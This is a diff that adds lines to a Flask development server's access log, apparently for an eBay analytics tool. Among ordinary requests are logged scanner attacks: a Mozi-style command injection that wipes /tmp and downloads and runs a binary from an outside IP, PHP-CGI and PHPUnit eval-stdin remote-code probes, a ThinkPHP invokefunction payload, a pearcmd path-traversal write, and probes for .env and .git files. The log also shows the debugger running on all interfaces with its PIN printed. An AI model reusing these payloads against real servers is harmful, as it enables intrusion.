@@ -81,3 +81,126 @@
 2026-04-20 20:46:46,776 - INFO - 127.0.0.1 - - [20/Apr/2026 20:46:46] "GET / HTTP/1.0" 200 -
 2026-04-20 20:46:49,864 - INFO - 127.0.0.1 - - [20/Apr/2026 20:46:49] "GET / HTTP/1.0" 200 -
 2026-04-20 20:46:50,065 - INFO - 127.0.0.1 - - [20/Apr/2026 20:46:50] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2026-04-20 21:18:29,350 - INFO - 127.0.0.1 - - [20/Apr/2026 21:18:29] "GET / HTTP/1.0" 200 -
+2026-04-20 21:18:36,318 - INFO - 127.0.0.1 - - [20/Apr/2026 21:18:36] "GET / HTTP/1.0" 200 -
+2026-04-20 21:20:23,142 - INFO - 127.0.0.1 - - [20/Apr/2026 21:20:23] "GET / HTTP/1.0" 200 -
+2026-04-20 21:20:26,555 - INFO - 127.0.0.1 - - [20/Apr/2026 21:20:26] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+http://180.119.109.43:36568/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0[0m" 404 -
+2026-04-20 21:45:10,906 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:10] "[33mGET /wp-content/plugins/hellopress/wp_filemanager.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,011 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /k.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,117 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /Marvins.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,222 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /kcs.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,327 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /wp-post-data.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,432 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /shell20211022.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,537 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /shell20211028.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,643 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /cs.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,748 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /1index.php HTTP/1.0[0m" 404 -
+2026-04-20 21:45:11,853 - INFO - 127.0.0.1 - - [20/Apr/2026 21:45:11] "[33mGET /subs/upload/upload.php HTTP/1.0[0m" 404 -
+2026-04-20 22:23:00,059 - INFO - 127.0.0.1 - - [20/Apr/2026 22:23:00] "GET / HTTP/1.0" 200 -
+2026-04-20 22:25:00,056 - INFO - 127.0.0.1 - - [20/Apr/2026 22:25:00] "GET / HTTP/1.0" 200 -
+2026-04-20 23:31:21,991 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:21] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.0[0m" 404 -
+2026-04-20 23:31:23,034 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:23] "[31m[1mPOST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.0[0m" 405 -
+2026-04-20 23:31:24,133 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:24] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:25,267 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:25] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:26,401 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:26] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:27,489 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:27] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:28,652 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:28] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:29,800 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:29] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:30,878 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:30] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:31,939 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:31] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:33,015 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:33] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:34,173 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:34] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:35,271 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:35] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:36,359 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:36] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:37,457 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:37] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:38,552 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:38] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:39,631 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:39] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:40,685 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:40] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:41,771 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:41] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:42,910 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:42] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:43,984 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:43] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:45,199 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:45] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:46,252 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:46] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:47,381 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:47] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:48,471 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:48] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:49,534 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:49] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:50,659 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:50] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:51,687 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:51] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:52,774 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:52] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:53,867 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:53] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:54,903 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:54] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:55,981 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:55] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:57,107 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:57] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:58,205 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:58] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:31:59,515 - INFO - 127.0.0.1 - - [20/Apr/2026 23:31:59] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:32:00,695 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:00] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:32:01,834 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:01] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:32:02,884 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:02] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:32:03,902 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:03] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+2026-04-20 23:32:04,910 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:04] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0[0m" 404 -
+2026-04-20 23:32:05,825 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:05] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.0[0m" 404 -
+2026-04-20 23:32:06,741 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:06] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.0[0m" 404 -
+2026-04-20 23:32:07,596 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:07] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.0[0m" 404 -
+2026-04-20 23:32:08,468 - INFO - 127.0.0.1 - - [20/Apr/2026 23:32:08] "[33mGET /containers/json HTTP/1.0[0m" 404 -
+2026-04-21 00:01:41,770 - INFO - 127.0.0.1 - - [21/Apr/2026 00:01:41] "GET / HTTP/1.0" 200 -
+2026-04-21 00:03:12,049 - INFO - 127.0.0.1 - - [21/Apr/2026 00:03:12] "[33mGET /webui/ HTTP/1.0[0m" 404 -
+2026-04-21 00:04:59,467 - INFO - 127.0.0.1 - - [21/Apr/2026 00:04:59] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2026-04-21 00:06:57,662 - INFO - 127.0.0.1 - - [21/Apr/2026 00:06:57] "[33mGET /geoserver/web/ HTTP/1.0[0m" 404 -
+2026-04-21 00:36:58,933 - INFO - 127.0.0.1 - - [21/Apr/2026 00:36:58] "GET / HTTP/1.0" 200 -
+2026-04-21 00:36:59,118 - INFO - 127.0.0.1 - - [21/Apr/2026 00:36:59] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2026-04-21 00:56:02,290 - ERROR - 35.203.211.135 - - [21/Apr/2026 00:56:02] code 400, message Bad request version ('À\x13À')
+2026-04-21 00:56:02,290 - INFO - 35.203.211.135 - - [21/Apr/2026 00:56:02] "[35m[1m\x16\x03\x01\x05Æ\x01\x00\x05Â\x03\x03\x9bÀwçÊ²W\x19æ×\x0eø\x96-ý\x8dþw1\x06\x06\x9cËÖçõ\x0ew> ¡\x99 \x9dµëæ-\x1f\x0d[\x90.\x1dÍ\x1cCÝpzÖ\x19db¦\x86îk³»\x1eÞÀ,'\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À[0m" HTTPStatus.BAD_REQUEST -
+2026-04-21 00:56:02,473 - ERROR - 35.203.211.135 - - [21/Apr/2026 00:56:02] code 400, message Bad request version ('À(À$À\x14À')
+2026-04-21 00:56:02,473 - INFO - 35.203.211.135 - - [21/Apr/2026 00:56:02] "[35m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Ä\x19ÒJ\x81³\x8aãx_a\x1fçØaC\x10É7}\x86\x1a5\x19ò \x03r\x93Ö:u\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+2026-04-21 02:23:14,509 - INFO - 165.22.47.21 - - [21/Apr/2026 02:23:14] "GET / HTTP/1.1" 200 -
+2026-04-21 02:23:14,554 - INFO - 165.22.47.21 - - [21/Apr/2026 02:23:14] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2026-04-21 02:49:08,656 - INFO - 127.0.0.1 - - [21/Apr/2026 02:49:08] "GET / HTTP/1.0" 200 -
+2026-04-21 03:27:40,620 - INFO - 205.210.31.230 - - [21/Apr/2026 03:27:40] "GET / HTTP/1.1" 200 -
+2026-04-21 03:55:16,183 - INFO - 127.0.0.1 - - [21/Apr/2026 03:55:16] "[33mGET /.env HTTP/1.0[0m" 404 -
+2026-04-21 03:55:17,209 - INFO - 127.0.0.1 - - [21/Apr/2026 03:55:17] "[31m[1mPOST / HTTP/1.0[0m" 405 -
+2026-04-21 04:09:32,885 - INFO - 127.0.0.1 - - [21/Apr/2026 04:09:32] "[33mGET /developmentserver/metadatauploader HTTP/1.0[0m" 404 -
+2026-04-21 04:12:00,659 - INFO - 127.0.0.1 - - [21/Apr/2026 04:12:00] "GET / HTTP/1.0" 200 -
+2026-04-21 05:43:13,994 - INFO - 104.236.53.154 - - [21/Apr/2026 05:43:13] "GET / HTTP/1.1" 200 -
+2026-04-21 05:43:14,037 - INFO - 104.236.53.154 - - [21/Apr/2026 05:43:14] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2026-04-21 06:19:08,504 - INFO - 127.0.0.1 - - [21/Apr/2026 06:19:08] "[33mGET /SDK/webLanguage HTTP/1.0[0m" 404 -
+2026-04-21 06:23:14,718 - INFO - 127.0.0.1 - - [21/Apr/2026 06:23:14] "GET / HTTP/1.0" 200 -
+2026-04-21 06:32:09,275 - INFO - 127.0.0.1 - - [21/Apr/2026 06:32:09] "[33mGET /.git/config HTTP/1.0[0m" 404 -
+2026-04-21 06:32:31,577 - INFO - 127.0.0.1 - - [21/Apr/2026 06:32:31] "[33mGET /login HTTP/1.0[0m" 404 -
+2026-04-21 07:23:41,269 - INFO - 127.0.0.1 - - [21/Apr/2026 07:23:41] "[33mGET /.env HTTP/1.0[0m" 404 -
+2026-04-21 07:23:41,813 - INFO - 127.0.0.1 - - [21/Apr/2026 07:23:41] "[31m[1mPOST / HTTP/1.0[0m" 405 -
+2026-04-21 08:20:30,303 - INFO - 127.0.0.1 - - [21/Apr/2026 08:20:30] "GET / HTTP/1.0" 200 -
+2026-04-21 09:04:00,609 - INFO - 127.0.0.1 - - [21/Apr/2026 09:04:00] "GET / HTTP/1.0" 200 -
+2026-04-21 09:06:11,490 - INFO - 127.0.0.1 - - [21/Apr/2026 09:06:11] "GET / HTTP/1.0" 200 -
+2026-04-21 09:13:53,470 - INFO - 127.0.0.1 - - [21/Apr/2026 09:13:53] "GET / HTTP/1.0" 200 -
+2026-04-21 09:14:59,156 - INFO - 127.0.0.1 - - [21/Apr/2026 09:14:59] "GET / HTTP/1.0" 200 -
+2026-04-21 09:18:29,021 - INFO - 127.0.0.1 - - [21/Apr/2026 09:18:29] "GET / HTTP/1.0" 200 -
+2026-04-21 09:18:30,796 - INFO - 127.0.0.1 - - [21/Apr/2026 09:18:30] "[33mGET /manage/account/login HTTP/1.0[0m" 404 -
+2026-04-21 09:18:32,339 - INFO - 127.0.0.1 - - [21/Apr/2026 09:18:32] "[33mGET /admin/index.html HTTP/1.0[0m" 404 -
+2026-04-21 09:18:36,507 - INFO - 127.0.0.1 - - [21/Apr/2026 09:18:36] "[33mGET /index.html HTTP/1.0[0m" 404 -
+2026-04-21 09:18:39,865 - INFO - 127.0.0.1 - - [21/Apr/2026 09:18:39] "[33mGET /+CSCOE+/logon.html HTTP/1.0[0m" 404 -
+2026-04-21 09:37:34,561 - INFO - 127.0.0.1 - - [21/Apr/2026 09:37:34] "[33mGET /.env HTTP/1.0[0m" 404 -
+2026-04-21 09:37:34,829 - INFO - 127.0.0.1 - - [21/Apr/2026 09:37:34] "[31m[1mPOST / HTTP/1.0[0m" 405 -
+2026-04-21 10:49:44,895 - INFO - 127.0.0.1 - - [21/Apr/2026 10:49:44] "[33mGET /.env HTTP/1.0[0m" 404 -
+2026-04-21 10:49:45,242 - INFO - 127.0.0.1 - - [21/Apr/2026 10:49:45] "[31m[1mPOST / HTTP/1.0[0m" 405 -
+2026-04-21 11:34:16,075 - INFO - 127.0.0.1 - - [21/Apr/2026 11:34:16] "GET / HTTP/1.0" 200 -
+2026-04-21 11:44:24,833 - INFO - 127.0.0.1 - - [21/Apr/2026 11:44:24] "GET / HTTP/1.0" 200 -
+2026-04-21 12:11:02,377 - INFO - 127.0.0.1 - - [21/Apr/2026 12:11:02] "GET / HTTP/1.0" 200 -
+2026-04-21 12:11:20,757 - INFO - 127.0.0.1 - - [21/Apr/2026 12:11:20] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2026-04-21 12:11:21,129 - INFO - 127.0.0.1 - - [21/Apr/2026 12:11:21] "[33mGET /robots.txt HTTP/1.0[0m" 404 -
+2026-04-21 12:11:21,499 - INFO - 127.0.0.1 - - [21/Apr/2026 12:11:21] "[33mGET /sitemap.xml HTTP/1.0[0m" 404 -
+2026-04-21 12:11:21,868 - INFO - 127.0.0.1 - - [21/Apr/2026 12:11:21] "[33mGET /config.json HTTP/1.0[0m" 404 -
+2026-04-21 12:36:23,083 - INFO - 127.0.0.1 - - [21/Apr/2026 12:36:23] "GET / HTTP/1.0" 200 -
+2026-04-21 12:42:20,670 - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.31.34.104:5000
+2026-04-21 12:42:20,671 - INFO - [33mPress CTRL+C to quit[0m
+2026-04-21 12:42:20,673 - INFO -  * Restarting with stat
+2026-04-21 12:42:20,833 - WARNING -  * Debugger is active!
+2026-04-21 12:42:20,833 - INFO -  * Debugger PIN: 128-711-666
+2026-04-21 12:44:02,413 - INFO - 127.0.0.1 - - [21/Apr/2026 12:44:02] "GET / HTTP/1.0" 200 -
+2026-04-21 12:44:11,408 - INFO - 127.0.0.1 - - [21/Apr/2026 12:44:11] "GET / HTTP/1.0" 200 -
+2026-04-21 12:49:33,188 - INFO - 127.0.0.1 - - [21/Apr/2026 12:49:33] "GET / HTTP/1.0" 200 -
+2026-04-21 13:07:33,032 - INFO -  * Detected change in '/home/ubuntu/ebay-analytics-tool/app.py', reloading
+2026-04-21 13:07:33,070 - INFO -  * Restarting with stat
+2026-04-21 13:07:33,234 - WARNING -  * Debugger is active!
+2026-04-21 13:07:33,234 - INFO -  * Debugger PIN: 128-711-666
